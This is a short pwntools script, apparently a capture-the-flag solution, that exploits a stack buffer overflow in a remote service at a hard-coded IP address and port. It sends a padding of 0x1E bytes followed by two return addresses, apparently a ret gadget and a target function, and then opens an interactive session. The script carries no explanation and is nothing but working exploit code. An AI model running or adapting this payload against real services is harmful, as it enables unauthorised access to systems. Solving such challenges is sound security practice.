from pwn import *

r = remote("65.2.136.80", 32194)
r.sendlineafter('word:',b'a'*0x1E+p64(0x000000000040101a)+p64(0x00401384))
r.interactive()
